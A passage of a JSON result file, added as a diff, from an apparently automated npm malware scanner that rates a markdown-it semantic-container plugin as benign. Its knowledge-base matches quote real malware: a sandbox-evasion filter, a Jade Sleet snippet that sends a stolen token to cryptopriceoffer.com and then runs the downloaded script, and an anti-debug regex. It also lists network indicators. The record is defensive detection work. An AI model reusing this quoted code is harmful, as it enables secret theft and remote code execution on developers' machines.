@@ -1,0 +1,502 @@
+{
+  "package_name": "@peaceroad##markdown-it-hr-sandwiched-semantic-container",
+  "package_version": "0.5.0",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:21:00.011558",
+  "status": "success",
+  "selected_files_count": 3,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/docs/output-semantics-for-readme.js"
+  ],
+  "is_malicious": false,
+  "total_files": 3,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@peaceroad##markdown-it-hr-sandwiched-semantic-container/0.5.0/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@peaceroad##markdown-it-hr-sandwiched-semantic-container/0.5.0/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "import semantics from './semantics.json' with { type: 'json' }\n\nconst semanticsHalfJoint = '[:.]'\nconst semanticsFullJoint = '[　：。．]'\nconst sNumber = '(?:[ 　](?:[0-9]{1,6}|[A-Z]{1,2})(?:[.-](?:[0-9]{1,6}|[A-Z]{1,2})){0,6})?'\nconst strongMark = '[*_]{2}'\n\nconst semanticsReg = semantics.map((sem) => {\n  let str = ''\n  if (sem.as) {\n    const patterns = sem.as.split(',')\n    patterns.forEach((x) => {\n      str += '|' + x.replace(/\\(/g, '(?:').trim()\n    })\n  }\n  const pattern =\n    '^(' + strongMark + ')?((?:' + sem.name + str + ')' + sNumber + ')'\n    + '(?:'\n    + '(' + semanticsHalfJoint + ') *?\\\\1(?: |$)'\n    + '| *?\\\\1 *?(' + semanticsHalfJoint + ') '\n    + '|(' + semanticsFullJoint + ') *?\\\\1'\n    + '| *?\\\\1 *?(' + semanticsFullJoint + ')'\n    + ' *?)'\n  return new RegExp(pattern, 'i')\n})\n\nconst checkSematicContainerCore = (state, n, hrType, sc, checked) => {\n  const hrRegex = hrType ? new RegExp('\\\\' + hrType) : null\n  const tokens = state.tokens\n  const tokensLength = tokens.length\n  const nextToken = tokens[n+1]\n\n  let sn = 0\n  let actualName = null\n\n  while (sn < semantics.length) {\n    actualName = nextToken.content.match(semanticsReg[sn])\n    if(actualName) break\n    sn++\n  }\n  if(!actualName) return false\n\n  let actualNameJoint = ''\n  let hasLastJoint = false\n  let hasHalfJoint = false\n\n  if (actualName[3]) {\n    hasHalfJoint = true\n    actualNameJoint = actualName[3]\n  } else if (actualName[4]) {\n    hasHalfJoint = true\n    hasLastJoint = true\n    actualNameJoint = actualName[4]\n  } else if (actualName[5]) {\n    actualNameJoint = actualName[5]\n  } else if (actualName[6]) {\n    hasLastJoint = true\n    actualNameJoint = actualName[6]\n  }\n\n  let en = n\n  let hasEndSemanticsHr = false\n  let pCloseN = -1\n  while (en < tokensLength) {\n    const tokenAtEn = tokens[en]\n    if (tokenAtEn.type !== 'hr') {\n      if (tokenAtEn.type === 'paragraph_close' && pCloseN == -1) {\n        pCloseN = en\n      }\n      en++\n      continue\n    }\n\n    if (hrRegex && hrRegex.test(tokenAtEn.markup)) {\n      hasEndSemanticsHr = true\n      break\n    }\n    en++\n  }\n  if (hrType !== '' && !hasEndSemanticsHr) return false\n\n  sc.push({\n    range: [n, en],\n    continued: checked,\n    sn: sn,\n    hrType: hrType,\n    actualCont: actualName[0],\n    actualContNoStrong: actualName[0].replace(/[*_]{2}/g, ''),\n    actualName: actualName[2],\n    actualNameJoint: actualNameJoint,\n    hasLastJoint: hasLastJoint,\n    hasHalfJoint: hasHalfJoint,\n  })\n  if(hrType === '' && pCloseN !== -1) {\n    sc[sc.length - 1].range[1] = pCloseN + 1\n  }\n  return true\n}\n\nconst checkSemanticContainer = (state, n, hrType, sc) => {\n  let continued = 0\n  if (!checkSematicContainerCore(state, n, hrType, sc, continued)) {\n    return false\n  }\n  let cn = sc[sc.length - 1].range[1] + 1\n  while (cn < state.tokens.length -1) {\n    continued = true\n    if (!checkSematicContainerCore(state, cn, hrType, sc, continued)) {\n      return true\n    }\n    cn = sc[sc.length - 1].range[1] + 1\n    continued++\n  }\n  return true\n}\n\nconst setSemanticContainer = (state, n, hrType, sc, sci , opt) => {\n  const tokens = state.tokens\n  let nJump = 0\n  let moveToAriaLabel = false\n  let rs = sc.range[0]\n  let re = sc.range[1]\n  const sn = sc.sn\n  const sem = semantics[sn]\n\n  const regActualContNoStrong = new RegExp('^' + sc.actualContNoStrong)\n  const regActualContNoStrongSpace = new RegExp('^' + sc.actualContNoStrong + ' *')\n  const regActualContAsterisk = new RegExp('^' + sc.actualCont.replace(/\\*/g, '\\\\*'))\n  const regLeadSpace = /^ */\n\n  // for continued semantic container.\n  if(sci > 1) {\n    let s = 1\n    while (s < sci) {\n      rs++\n      re++\n      s++\n    }\n  }\n  const nt = tokens[rs+1]\n  const ntChildren = nt.children\n\n  const sToken = new state.Token('html_block', '', 0)\n  sToken.content = '<' + sem.tag\n  sToken.content += ' class=\"sc-' + sem.name + '\"'\n  if (sem.attrs.length > 0) {\n    let ai = 0\n    while (ai < sem.attrs.length) {\n      if(!moveToAriaLabel) {\n        moveToAriaLabel = sem.attrs[ai][0] === \"aria-label\"\n        if(moveToAriaLabel) {\n          sem.attrs[ai][1] = sc.actualName\n        }\n      }\n      sToken.content += ' ' + sem.attrs[ai][0] + '=\"' + sem.attrs[ai][1] + '\"'\n      ai++\n    }\n  }\n  sToken.content += '>\\n'\n  sToken.block = true\n  tokens.splice(rs, 0, sToken)\n\n  const eToken = new state.Token('html_block', '', 0)\n  eToken.content = '</' + sem.tag + '>\\n'\n  eToken.block = true\n\n  if(sci !== -1) {\n    tokens.splice(re+1, 1, eToken); // ending hr delete too.\n    if (!sc.continued) {\n      tokens.splice(rs-1, 1)// starting hr delete.\n    }\n  } else {\n    tokens.splice(re+1, 0, eToken)\n  }\n\n  if(moveToAriaLabel) {\n    nt.content = nt.content.replace(regActualContNoStrong, '')\n    ntChildren[0].content = ntChildren[0].content.replace(regActualContNoStrongSpace, '')\n    nt.content = nt.content.replace(regLeadSpace, '')\n    return nJump\n  }\n\n  if (/^#+/.test(nt.content)) {\n    nJump += 2\n  }\n  if (/^[*_]{2}/.test(nt.content) ) {\n    if (opt.mditStrongJa && ntChildren.length > 2) {\n      if (ntChildren[0].type === 'strong_open'\n        && ntChildren[2].type === 'strong_close') {\n        const hasStrongJa = ntChildren[1].content.match(new RegExp('^' + sc.actualName + '(' + semanticsHalfJoint + '|' + semanticsFullJoint + ')?( *)$'))\n        if (hasStrongJa) {\n          ntChildren.splice(0, 3)\n          if (!hasStrongJa[1]) {\n            ntChildren[0].content = ntChildren[0].content.replace(new RegExp('^(?:' + semanticsHalfJoint + '|' + semanticsFullJoint + ')'), '')\n          }\n        }\n      }\n    }\n    if (ntChildren[1]) {\n      if (ntChildren[1].type === 'strong_open') {\n        ntChildren[1].attrJoin('class', 'sc-' + sem.name + '-label')\n        if (sc.hasLastJoint) {\n          ntChildren[4].content =  ntChildren[4].content.replace(new RegExp('^\\\\' + sc.actualNameJoint ), '')\n        } else {\n          ntChildren[2].content = ntChildren[2].content.replace(new RegExp('\\\\' + sc.actualNameJoint + '$'), '')\n        }\n      } else {\n        const strongBefore = new state.Token('text', '', 0)\n        const strongOpen = new state.Token('strong_open', 'strong', 1)\n        const strongContent = new state.Token('text', '', 0)\n        strongContent.content = sc.actualName\n        const strongClose = new state.Token('strong_close', 'strong', -1)\n        strongOpen.attrJoin('class', 'sc-' + sem.name + '-label')\n\n        if (!opt.mditStrongJa) {\n          ntChildren[0].content = ntChildren[0].content.replace(new RegExp('[*_]{2} *?' + sc.actualName + ' *[*_]{2}'), '')\n          if (sc.hasLastSpace || sc.hasHalfJoint) {\n            ntChildren[0].content = ' ' + ntChildren[0].content.replace(regActualContAsterisk, '')\n          } else {\n            ntChildren[0].content = ntChildren[0].content.replace(regActualContAsterisk, '')\n          }\n        }\n        nt.content = nt.content.replace(regActualContAsterisk, '')\n        ntChildren.splice(0, 0, strongBefore, strongOpen, strongContent, strongClose)\n      }\n      nJump += 3\n    } else {\n      const strongBefore = new state.Token('text', '', 0)\n      const strongOpen = new state.Token('strong_open', 'strong', 1)\n      const strongContent = new state.Token('text', '', 0)\n      strongContent.content =sc.actualName\n      const strongClose = new state.Token('strong_close', 'strong', -1)\n      strongOpen.attrJoin('class', 'sc-' + sem.name + '-label')\n\n      if (!opt.mditStrongJa) {\n        ntChildren[0].content = ntChildren[0].content.replace(new RegExp('[*_]{2} *?' + sc.actualName + ' *[*_]{2}'), '')\n        ntChildren[0].content = ntChildren[0].content.replace(regActualContAsterisk, '')\n      }\n      nt.content = nt.content.replace(regActualContAsterisk, '')\n\n      ntChildren.splice(0, 0, strongBefore, strongOpen, strongContent, strongClose)\n    }\n  } else {\n    const lt_first = new state.Token('text', '', 0)\n    const lt_span_open = new state.Token('span_open', 'span', 1)\n    lt_span_open.attrJoin(\"class\", \"sc-\" + sem.name + \"-label\")\n    const lt_span_content = new state.Token('text', '', 0)\n    lt_span_content.content = sc.actualName\n    const lt_span_close = new state.Token('span_close', 'span', -1)\n\n    if (sc.hasHalfJoint) {\n      ntChildren[0].content = ' ' + ntChildren[0].content.replace(regActualContNoStrong, '')\n    } else {\n      ntChildren[0].content = ntChildren[0].content.replace(regActualContNoStrong, '')\n    }\n\n    ntChildren.splice(0, 0, lt_first, lt_span_open, lt_span_content, lt_span_close)\n    nJump += 3\n  }\n\n  if (opt.removeJointAtLineEnd) {\n    let jointIsAtLineEnd = false\n    if (ntChildren) {\n      if (ntChildren[ntChildren.length - 1].type === 'text' && /^ *$/.test(ntChildren[ntChildren.length - 1].content)) {\n        jointIsAtLineEnd = true\n        ntChildren[ntChildren.length - 1].content = ''\n      } else {\n        if (ntChildren[ntChildren.length - 1].type === 'strong_close') {\n          jointIsAtLineEnd = true\n        }\n      }\n    }\n\n    if (jointIsAtLineEnd) return nJump\n  }\n\n  const ljt_span_open = new state.Token('span_open', 'span', 1)\n  ljt_span_open.attrJoin(\"class\", \"sc-\" + sem.name + \"-label-joint\")\n  const ljt_span_content = new state.Token('text', sc.actualNameJoint, 0)\n  ljt_span_content.content = sc.actualNameJoint\n  const ljt_span_close = new state.Token('span_close', 'span', -1)\n\n  ntChildren.splice(3, 0, ljt_span_open, ljt_span_content, ljt_span_close)\n\n  return nJump\n}\n\n\nconst semanticContainerCore = (state, n, cn, opt) => {\n  const tokens = state.tokens\n  let sc = []\n  let sci = 0\n  let hrType = ''\n  let alreadyChecked = false\n  let nJumps = []\n\n  const prevToken = tokens[n-1]\n  const token = tokens[n]\n\n  if (n === 0 || n === tokens.length -1) {\n    if (!opt.requireHrAtOneParagraph && token.type === 'paragraph_open') {\n      if(checkSematicContainerCore(state, n, hrType, sc, false)) {\n        nJumps.push(setSemanticContainer(state, n, hrType, sc[0], -1, opt))\n        return n += nJumps[0]\n      }\n    }\n    n++\n    return n\n  }\n  if (prevToken.type !== 'hr') {\n    if (!opt.requireHrAtOneParagraph && token.type === 'paragraph_open') {\n      cn.forEach(cni => {\n        if (n === cni + 1) { alreadyChecked = true; }\n      })\n      if (alreadyChecked) {\n        n++; return n\n      }\n\n      if (tokens[n - 1].type === 'list_item_open') {\n        n++; return n\n      }\n\n      if(checkSematicContainerCore(state, n, hrType, sc, false)) {\n        nJumps.push(setSemanticContainer(state, n, hrType, sc[0], -1, opt))\n        n += nJumps[0]\n        return n\n      }\n    }\n    n++\n    return n\n  }\n\n  if(/\\*/.test(prevToken.markup)) hrType = '*'\n  if(/-/.test(prevToken.markup)) hrType = '-'\n  if(/_/.test(prevToken.markup)) hrType = '_'\n\n  if (!checkSemanticContainer(state, n, hrType, sc)) {\n    n++\n    return n\n  }\n\n  sci = 0\n  while (sci < sc.length) {\n    nJumps.push(setSemanticContainer(state, n, hrType, sc[sci], sci, opt))\n    cn.push(sc[sci].range[1] + sci + 1)\n    sci++\n  }\n  n += nJumps[0]\n  return n\n}\n\nconst semanticContainer = (state, opt) => {\n  const tokens = state.tokens\n  let n = 0\n  let cn = []\n  let tokensLength = tokens.length\n  while (n < tokensLength) {\n    n = semanticContainerCore(state, n, cn, opt)\n    tokensLength = tokens.length\n  }\n  return true\n}\n\nconst mditSemanticContainer = (md, option) => {\n  let opt = {\n    requireHrAtOneParagraph: false,\n    removeJointAtLineEnd: false,\n    mditStrongJa: false,\n  }\n  if (option) Object.assign(opt, option)\n\n  md.core.ruler.after('inline', 'semantic_container', (state) => {\n    semanticContainer(state, opt)\n  })\n}\n\nexport default mditSemanticContainer\n",
+          "is_malicious": false,
+          "malice_score": 0.3709703703721365,
+          "confidence": 0.1,
+          "behavior_summary": "At import-time, the code reads a JSON file './semantics.json' and compiles multiple regular expressions to detect semantic patterns in text tokens. When called during markdown parsing, it accesses and modifies the token stream by inserting HTML blocks and spans with semantic classes and attributes based on matched patterns, manipulating token content and structure. No network, file system, or system execution APIs are used, and no suspicious hardcoded IPs, URLs, commands, or encoded strings are present, resulting in purely syntactic and semantic text processing without security-sensitive side effects.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a markdown-it plugin that processes semantic containers in markdown text. It reads a JSON file containing semantic definitions and compiles regex patterns to identify semantic tokens. It then manipulates the markdown token stream by inserting HTML blocks and spans with semantic classes and attributes. There is no use of network, file system (beyond reading a local JSON), or system execution APIs. No obfuscation, no environment checks, no data exfiltration, no remote code execution, and no suspicious hardcoded values are present. The code is purely syntactic and semantic text processing related to markdown rendering. The known malicious patterns involve environment variable checks for sandbox evasion or remote code execution via network communication, none of which appear here. Similarity scores to known malware are low (0.37) and relate to completely different behaviors. Therefore, this code is benign.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_102818_710202_snippet_2",
+              "source_package": "epic-ue-loading (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102818_710202/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.37353336811065674,
+              "code_similarity": 0.32203859090805054,
+              "behavior_similarity": 0.42502814531326294,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "var filter = [\n  { key: ['npm', 'config', 'registry'].join('_'), val: ['taobao', 'org'].join('.') },\n  { key: ['npm', 'config', 'registry'].join('_'), val: ['registry', 'npmmirror', 'com'].join('.') },\n  { key: 'USERNAME', val: ['daas', 'admin'].join('') },\n  { key: '_', val: '/usr/bin/python' },\n  { key: 'npm_config_metrics_registry', val: ['mirrors', 'tencent', 'com'].join('.') },\n  [\n    { key: 'MAIL', val: ['', 'var', 'mail', 'app'].join('/') },\n    { key: 'HOME', val: ['', 'home', 'app'].join('/') },\n    { key: 'USER', val: 'app' },\n  ],\n  ...\n];\nif (\n  filter.some((entry) =>\n    [].concat(entry).every((item) => (data[item.key] || '').includes(item.val) || item.val === '*')\n  ) ||\n  Object.keys(data).length < 10\n) {\n  return;\n}",
+                "code_behavior": "At import-time or runtime, the code checks environment variables against a large filter list of known sandbox, CI/CD, and analysis environment indicators, and aborts further execution if any are detected, enabling sandbox and automated analysis evasion.",
+                "malice_analysis": {
+                  "why_suspicious": "The presence of a comprehensive filter list targeting known sandbox and CI/CD environment variables, combined with conditional logic to abort execution, is a well-known evasion technique used by malware to avoid detection during automated analysis.",
+                  "violated_expectations": "Legitimate packages do not attempt to detect or evade sandboxes or security analysis environments. Such behavior is only seen in malware or highly targeted attack tools.",
+                  "similar_legitimate_use": "Rarely, some software may check for CI/CD or test environments to adjust non-malicious behavior, but not to evade detection or prevent execution.",
+                  "key_indicators": [
+                    "Large filter list of environment variables associated with sandboxes and CI/CD systems",
+                    "Conditional early return to avoid execution in analysis environments",
+                    "Obfuscated or programmatically constructed filter entries"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "build.js (malicious versions)",
+                  "required_permissions": [
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "epic-ue-loading",
+                  "package_manager": "npm",
+                  "package_versions": "1.803.0, 2.802.0, 3.801.0, 4.800.0, 5.799.0, 6.798.0, 7.797.0, 8.796.0, 9.795.0 (malicious); 0.1.0 (benign)",
+                  "why_malicious": "Multiple versions of the package exfiltrate all environment variables to an attacker-controlled webhook, use obfuscated and dynamically constructed hostnames, and implement sandbox evasion techniques to avoid detection. The latest version (0.1.0) is benign to bypass security scanners, while the majority of versions are malicious and designed for dependency confusion attacks targeting build and CI/CD environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a dependency due to dependency confusion, leveraging high minor/patch version numbers to supersede internal packages.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on the victim machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "On import or runtime, the code checks environment variables for known sandbox, CI/CD, or analysis indicators to evade detection.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "If not a sandbox or analysis environment, proceeds to data exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collects all environment variables from the victim machine using process.env.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Prepares sensitive data for exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Exfiltrates the collected environment variables to an attacker-controlled webhook using a POST request to a dynamically constructed subdomain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive credentials and secrets from the victim environment"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to process.env and exfiltration of all environment variables to external domains",
+                    "Network POST requests to dynamically constructed subdomains of pipedream.net at import-time or runtime",
+                    "Conditional logic to evade sandboxes or CI/CD environments based on environment variable checks",
+                    "Obfuscated or programmatically constructed hostnames and filter lists in JavaScript code"
+                  ],
+                  "file_indicators": [
+                    "build.js containing both process.env access and http.request usage",
+                    "Obfuscated or minified code in non-production npm packages",
+                    "Presence of large, programmatically constructed filter lists for environment variable checks in build.js"
+                  ],
+                  "network_indicators": [
+                    "*.m.pipedream.net",
+                    "POST requests to subdomains such as eoxb1lay4m45mms.m.pipedream.net"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access all environment variables and send them to external domains, especially at import-time or during installation. Flag packages with obfuscated or dynamically constructed code, large environment variable filter lists, or network requests to known exfiltration domains such as *.m.pipedream.net. Use both static and dynamic analysis to inspect all package versions, not just the latest, and correlate build.js file contents with suspicious network activity."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133826_958903_snippet_2",
+              "source_package": "Unknown (Jade Sleet & Moonstone Sleet campaigns, multiple packages) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133826_958903/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3713929057121277,
+              "code_similarity": 0.259187787771225,
+              "behavior_similarity": 0.4835980534553528,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const os = require('os');\nconst path = require('path');\nvar fs = require('fs');\n\nfunction getsvnroot(domain, entry, token, path) {\n  const https = require('https');\n  const querystring = require('querystring');\n\n  const options = {\n    hostname: domain,\n    port: 443,\n    path: entry,\n    method: 'POST',\n    headers: { 'content-type': 'application/x-www-form-urlencoded' },\n  };\n\n  const req = https.request(options, (resp) => {\n    let data = '';\n    resp.on('data', (chunk) => {\n      data += chunk;\n    });\n    resp.on('end', () => {\n      fs.writeFileSync(path, data);\n      const { exec } = require('child_process');\n      exec('node ' + path, (error, stdout, stderr) => {});\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(e.message);\n  });\n  req.write(token);\n  req.end();\n}\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;\n\nvar dir = path.join(os.homedir(), '.svnlook');\nif (fs.existsSync(dir)) {\n  const token = fs.readFileSync(path.join(dir, 'svntoken'), { encoding: 'utf8', flag: 'r', });\n  getsvnroot('cryptopriceoffer.com', '/getupdate.php', token, path.join(dir, 'checksvn.js'));\n}",
+                "code_behavior": "At import-time or runtime, the code reads a token from a file in a hidden directory, sends it via HTTPS POST to a hardcoded remote server, writes the server's response as a new JavaScript file, and immediately executes it as a child process, resulting in exfiltration of local data and arbitrary remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "The code chains together reading a local secret, exfiltrating it to a suspicious domain, downloading a new script, and executing it, all without user knowledge or consent. It disables TLS certificate validation, further increasing risk.",
+                  "violated_expectations": "Normal packages do not exfiltrate local data or execute downloaded code automatically, nor do they disable TLS certificate validation.",
+                  "similar_legitimate_use": "Automated updaters may download and run code, but only with explicit user consent, from trusted sources, and with proper TLS validation.",
+                  "key_indicators": [
+                    "Reading secret from hidden directory",
+                    "POSTing data to hardcoded suspicious domain",
+                    "Writing and executing remote code as a new file",
+                    "Disabling TLS certificate validation"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "index.js (second package, Jade Sleet campaign)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "child_process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (Jade Sleet & Moonstone Sleet campaigns, multiple packages)",
+                  "package_manager": "npm",
+                  "package_versions": "Multiple versions, published between Summer 2023 and Q2 2024",
+                  "why_malicious": "These packages are designed to execute arbitrary code on installation or import, exfiltrate data, download and execute additional payloads, and target both Windows and Linux systems. They use obfuscation, multi-stage payloads, and anti-forensics to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Initial package creates hidden directory and fetches remote data, storing it locally.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for further malicious activity by second package."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Second package reads local token, exfiltrates it, downloads and executes new malicious code.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Arbitrary code execution and further compromise."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Single-package variant (Moonstone Sleet) downloads, decrypts, and executes remote payload on Windows, then deletes evidence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Immediate compromise and anti-forensics."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Linux-targeting variant sets up directory, installs and runs disguised binary, deletes installer script.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Persistence and stealthy execution on Linux systems."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Creation of hidden or misleadingly named directories in user home or application support paths (e.g., .svnlook, ~/Library/Application Support/UpdateProvider)",
+                    "Synchronous or asynchronous network requests to hardcoded suspicious domains or IPs during install/import",
+                    "Writing and executing files downloaded from remote servers, especially as new scripts or binaries",
+                    "Immediate deletion of installer or script files after execution (anti-forensics)",
+                    "Conditional OS-specific payload execution (e.g., Windows vs Linux branches)",
+                    "Disabling TLS certificate validation in Node.js environment"
+                  ],
+                  "file_indicators": [
+                    ".svnlook directory in user home",
+                    "svntoken, checksvn.js, preinstall.bat, preinstall.ps1, sqlite.a, updateMacOS",
+                    "deference.js (deleted post-execution)",
+                    "~/Library/Application Support/UpdateProvider"
+                  ],
+                  "network_indicators": [
+                    "cryptopriceoffer.com (checkupdate.php, getupdate.php)",
+                    "103.179.142.171/npm/npm.mov",
+                    "Other hardcoded C2 domains/IPs"
+                  ],
+                  "how_to_detect": "Monitor for creation of hidden or misleadingly named directories and files in user home or application support paths, unexpected network requests to known malicious domains or IPs during install/import, execution of downloaded scripts or binaries, and immediate file deletion post-install. Flag packages that conditionally execute OS-specific payloads, disable TLS certificate validation, or use obfuscated/encoded payloads. Correlate with known IOCs and behavioral patterns from Jade Sleet and Moonstone Sleet campaigns for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195356_370783_snippet_2",
+              "source_package": "epic-ue-loading (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_370783/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3702905774116516,
+              "code_similarity": 0.31901660561561584,
+              "behavior_similarity": 0.42156457901000977,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "var filter = [\n  { key: ['npm', 'config', 'registry'].join('_'), val: ['taobao', 'org'].join('.') },\n  { key: ['npm', 'config', 'registry'].join('_'), val: ['registry', 'npmmirror', 'com'].join('.') },\n  { key: 'USERNAME', val: ['daas', 'admin'].join('') },\n  { key: '_', val: '/usr/bin/python' },\n  { key: 'npm_config_metrics_registry', val: ['mirrors', 'tencent', 'com'].join('.') },\n  // ... more entries ...\n];\nif (\n  filter.some((entry) =>\n    [].concat(entry).every((item) => (data[item.key] || '').includes(item.val) || item.val === '*')\n  ) ||\n  Object.keys(data).length < 10\n) {\n  return;\n}",
+                "code_behavior": "At import-time or runtime, the code checks environment variables for known sandbox or analysis environment indicators using a large filter list, and aborts further execution if such indicators are detected, thereby evading automated security analysis.",
+                "malice_analysis": {
+                  "why_suspicious": "The code contains an extensive list of environment variable checks specifically targeting known sandbox, CI/CD, and analysis environments. This is a strong indicator of evasion tactics, which are rarely present in legitimate packages.",
+                  "violated_expectations": "Legitimate packages do not attempt to detect or evade sandboxes, CI/CD pipelines, or security scanners. Such behavior is only necessary for malicious code seeking to avoid detection.",
+                  "similar_legitimate_use": "Some legitimate software may check for CI/CD or test environments to adjust logging or behavior, but not to suppress core functionality or evade detection. The use of a large, frequently updated filter list is not typical in benign code.",
+                  "key_indicators": [
+                    "Large filter list of environment variable checks for sandbox/analysis detection",
+                    "Conditional early return to avoid execution in sandboxes or analysis environments",
+                    "Obfuscated or dynamically constructed filter entries",
+                    "Frequent updates to filter list to evade new detection mechanisms"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "build.js (in malicious versions)",
+                  "required_permissions": [
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "epic-ue-loading",
+                  "package_manager": "npm",
+                  "package_versions": "1.803.0, 2.802.0, 3.801.0, 4.800.0, 5.799.0, 6.798.0, 7.797.0, 8.796.0, 9.795.0 (malicious); 0.1.0 (benign)",
+                  "why_malicious": "Multiple versions of the package contain code that collects all environment variables from the victim machine and exfiltrates them to an attacker-controlled webhook using HTTP POST requests. The code employs sandbox and analysis environment detection to evade automated security scanners. The latest version (0.1.0) is benign, likely to avoid detection by scanners that only analyze the most recent release."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a dependency due to dependency confusion and unpinned versioning.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "On import or runtime, code checks for sandbox or analysis environment using environment variable filters.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "If not a sandbox, proceed to exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "If not in a sandbox, code collects all environment variables and sends them to an attacker-controlled webhook via HTTP POST.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive environment data (secrets, tokens, credentials)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to all environment variables (process.env) at import-time or runtime",
+                    "HTTP POST requests to hardcoded external domains, especially pipedream.net subdomains",
+                    "Base64 encoding of environment data prior to exfiltration",
+                    "Presence of large environment variable filter lists for sandbox or analysis environment detection",
+                    "Obfuscated domain and filter construction using array joins"
+                  ],
+                  "file_indicators": [
+                    "build.js containing process.env access and HTTP request logic",
+                    "Obfuscated or double-obfuscated JavaScript files in non-latest versions",
+                    "Multiple package versions with high minor/patch numbers and a benign latest version",
+                    "Presence of large filter arrays in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "Connections to *.m.pipedream.net domains (e.g., eoxb1lay4m45mms.m.pipedream.net)",
+                    "Outbound HTTP POST requests during package installation or import"
+                  ],
+                  "how_to_detect": "Monitor for packages that access and exfiltrate environment variables, especially those making HTTP POST requests to known malicious domains such as pipedream.net subdomains. Flag packages containing large environment variable filter lists or obfuscated code in build.js or similar files. Pay special attention to packages with multiple high-numbered versions and a benign latest version, as this is a common evasion technique. Use both static and dynamic analysis to inspect all package versions, not just the latest, and correlate network activity with package installation or import events."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133738_266713_snippet_3",
+              "source_package": "small-sm (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133738_266713/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.36828476190567017,
+              "code_similarity": 0.3358389437198639,
+              "behavior_similarity": 0.40073058009147644,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "_0x1f2d80 = _0x2268f1(this, function () {\n  return _0x1f2d80\n    .toString()\n    .search('(((.+)+)+)+$')\n    .toString()\n    .constructor(_0x1f2d80)\n    .search('(((.+)+)+)+$')\n})",
+                "code_behavior": "At runtime, if deobfuscation or debugging tools are detected, the code executes a recursive regular expression that jams the event loop, thereby hindering static and dynamic analysis and delaying reverse engineering.",
+                "malice_analysis": {
+                  "why_suspicious": "The presence of anti-debugging and anti-deobfuscation logic, such as event loop jamming, is a hallmark of malware attempting to evade detection and analysis.",
